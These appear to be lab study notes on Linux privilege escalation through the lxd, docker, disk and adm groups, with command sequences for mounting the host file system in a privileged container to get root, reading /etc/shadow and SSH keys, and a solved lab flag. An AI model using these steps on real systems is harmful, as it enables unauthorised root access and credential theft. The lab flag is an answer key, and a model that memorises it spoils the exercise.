# Privileged Groups

## LXC / LXD

`LXD` -> similar to Docker

* Upon installation, all users are added to the LXD group.
* Membership of this group can be used to escalate privileges
  * **creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`.**

Confirm group membership and use these rights to escalate to root.

```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Unzip the Alpine image.

```shell-session
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

```shell-session
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

Import the local image.

```shell-session
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```shell-session
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

Mount the host file system.

```shell-session
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

Spawn a shell inside the container instance. We can now browse the mounted host file system as root.

type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```

## Docker

* Placing user in Docker group is like placing them into root
* Members of the docker group can spawn new docker containers.
* `docker run -v /root:/mnt -it ubuntu`. This command create a new Docker instance with the /root directory on the host file system mounted as a volume.
* Once container starts  we can retrive or add SSH keys for the root user.
* It's not limited to root directory, we can mount /etc to obtain /etc/shadow file

## Disk

* Users in disk group have full access to any devices contained within `/dev`, such as `/dev/sda1` -> main device used by the operating system.
* Attacker with this privilege can use debugfs to access entire file system with root level privileges. We can use this to get SSH keys, credentials or add a user

### ADM

* ADM group can read all logs in /var/log.
* Can be leveraged to gather sensitive data stored in log files or enum user action and cron jobs

```shell-session
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

## Assessment

Use the privileged group rights of the secaudit user to locate a flag.

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption><p>ADM group</p></figcaption></figure>

```
secaudit@NIX02:/var/log$ grep -r -l 'flag' . 2>/dev/null
./installer/hardware-summary
./apache2/access.log
secaudit@NIX02:/var/log$ cat ./apache2/access.log | grep "flag"
10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps! HTTP/1.1" 301 409 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps HTTP/1.1" 404 27847 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
```

